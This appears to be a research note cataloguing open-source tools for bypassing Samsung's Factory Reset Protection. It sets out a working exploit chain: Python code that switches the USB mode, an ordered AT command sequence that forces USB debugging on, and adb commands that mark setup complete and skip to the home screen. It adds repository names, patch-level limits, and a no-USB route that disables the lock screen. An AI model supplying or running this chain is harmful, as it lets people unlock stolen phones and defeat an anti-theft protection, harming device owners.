# Samsung FRP Bypass — Open-Source Tool Research (July 2026)

## Core Exploit Chain

Samsung FRP bypass follows a 3-step pattern:

### 1. USB Mode Switch (CDC ACM)
Samsung devices expose USB config 2 (modem/ACM) even with USB debugging off.

```python
import usb.core
dev = usb.core.find(idVendor=0x04e8, idProduct=0x6860)  # Samsung Galaxy
dev.reset()
dev.set_configuration(0x2)  # Switch to modem mode → exposes /dev/ttyACM0
```

USB ID: `04e8:6860` (Samsung Galaxy, various models)
Source: `apeppels/galaxy-at-tool`, CVE-2016-4030

### 2. AT Commands over Serial
Send AT commands to enable USB debugging:

```python
# Sequence from riskeco/Samsung-FRP-Bypass
AT+KSTRINGB=0,3      # Prep
AT+DUMPCTRL=1,0      # Dump control
AT+DEBUGLVC=0,5      # Forces USB re-enumeration, enables debugging
AT+SWATD=0           # AT daemon off
AT+ACTIVATE=0,0,0    # Activate debugging
AT+SWATD=1           # AT daemon on
AT+DEBUGLVC=0,5      # Re-enable (after reconnection)
```

**Key command:** `AT+DEBUGLVC=0,5` — changes USB config, temporarily disconnects device. This is the core exploit that forces USB debugging to become available.

Dependencies: `pyserial==3.5`, `pyusb==1.2.1`

### 3. ADB Shell Bypass
Once ADB is available, bypass FRP via settings manipulation:

```bash
# Set setup completion flags
content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1
content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1
settings put global setup_wizard_has_run 1

# Skip to home screen
am start -c android.intent.category.HOME -a android.intent.action.MAIN
```

## Key Repositories

### riskeco/Samsung-FRP-Bypass (⭐ 124+)
- **Files:** `main.py`, `at_utils.py`, `usbswitcher.py`, `adb_utils.py`
- **Dependencies:** `pyserial==3.5`, `pyusb==1.2.1`
- **Workflow:** USB switch → AT commands → ADB bypass (via frp.bin or manual commands)
- **Blog:** `blog-cyber.riskeco.com/en/analysis-of-samsung-frp-bypass/`

### NDXCode/Samsung-FRP-Bypass-WEB (⭐ 124)
- **Browser-based** using WebSerial + WebUSB
- **Limitation:** Security patches **before August 2022 only**
- Uses same AT commands as riskeco (credits them)
- Automated version at `autofrp/`

### apeppels/galaxy-at-tool (⭐ 51)
- General-purpose Samsung AT modem tool
- Documents CVE-2016-4030: secondary USB config exposes AT modem
- Samsung's stance: AT commands only work when device is unlocked = "Working as Intended"
- Works on S8 (G950F), S9 (G965F) when unlocked

### spacecase123/Android_12_FRPBypass (⭐ 54)
- **No USB needed** — Talkback → Bixby → Alliance Shield X → Service Mode → ADB
- Works on Android 12, security patch ≤ 2022-02-01
- Uses `cmd lock_settings set-disabled true` to disable lock screen

## Modern Device Limitations (OneUI 5/6, Android 14+)

- **August 2022+ security patches:** `AT+DEBUGLVC` no longer enables USB debugging the same way
- Samsung may restrict USB config switching or add AT command verification on newer OneUI
- No open-source tools found that explicitly support OneUI 5/6 FRP bypass
- The AT command method appears patched on recent security updates

## Samsung FRP TestPoint MBN

`prabhathgwp/SamsungFRP_TestPoint_MBN` — MBN files for Qualcomm EDL mode FRP bypass via test point shorting. Used with tools like QFIL/EDL for flashing/unlocking on Qualcomm-based Samsung devices.
